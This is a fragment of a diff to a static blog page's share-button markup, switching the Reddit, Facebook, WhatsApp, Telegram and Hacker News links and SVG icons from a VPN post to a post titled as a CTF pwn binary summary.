-        href="https://reddit.com/submit?url=https%3a%2f%2fruralbee.github.io%2fposts%2fvpn%2fmagic_internet%2f&title=2023%e5%b9%b4windows%2cMac%e7%a7%91%e5%ad%a6%e4%b8%8a%e7%bd%91">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share CTF Pwn二进制总结 on reddit"
+        href="https://reddit.com/submit?url=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fpwn_stack%2f&title=CTF%20Pwn%e4%ba%8c%e8%bf%9b%e5%88%b6%e6%80%bb%e7%bb%93">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
         </svg>
     </a>
-    <a target="_blank" rel="noopener noreferrer" aria-label="share 2023年windows,Mac科学上网 on facebook"
-        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fruralbee.github.io%2fposts%2fvpn%2fmagic_internet%2f">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share CTF Pwn二进制总结 on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fpwn_stack%2f">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
         </svg>
     </a>
-    <a target="_blank" rel="noopener noreferrer" aria-label="share 2023年windows,Mac科学上网 on whatsapp"
-        href="https://api.whatsapp.com/send?text=2023%e5%b9%b4windows%2cMac%e7%a7%91%e5%ad%a6%e4%b8%8a%e7%bd%91%20-%20https%3a%2f%2fruralbee.github.io%2fposts%2fvpn%2fmagic_internet%2f">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share CTF Pwn二进制总结 on whatsapp"
+        href="https://api.whatsapp.com/send?text=CTF%20Pwn%e4%ba%8c%e8%bf%9b%e5%88%b6%e6%80%bb%e7%bb%93%20-%20https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fpwn_stack%2f">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
         </svg>
     </a>
-    <a target="_blank" rel="noopener noreferrer" aria-label="share 2023年windows,Mac科学上网 on telegram"
-        href="https://telegram.me/share/url?text=2023%e5%b9%b4windows%2cMac%e7%a7%91%e5%ad%a6%e4%b8%8a%e7%bd%91&amp;url=https%3a%2f%2fruralbee.github.io%2fposts%2fvpn%2fmagic_internet%2f">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share CTF Pwn二进制总结 on telegram"
+        href="https://telegram.me/share/url?text=CTF%20Pwn%e4%ba%8c%e8%bf%9b%e5%88%b6%e6%80%bb%e7%bb%93&amp;url=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fpwn_stack%2f">
         <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
             <path
                 d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
         </svg>
     </a>
-    <a target="_blank" rel="noopener noreferrer" aria-label="share 2023年windows,Mac科学上网 on ycombinator"
-        href="https://news.ycombinator.com/submitlink?t=2023%e5%b9%b4windows%2cMac%e7%a7%91%e5%ad%a6%e4%b8%8a%e7%bd%91&u=https%3a%2f%2fruralbee.github.io%2fposts%2fvpn%2fmagic_internet%2f">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share CTF Pwn二进制总结 on ycombinator"
+        href="https://news.ycombinator.com/submitlink?t=CTF%20Pwn%e4%ba%8c%e8%bf%9b%e5%88%b6%e6%80%bb%e7%bb%93&u=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fpwn_stack%2f">
         <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
             xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
             <path
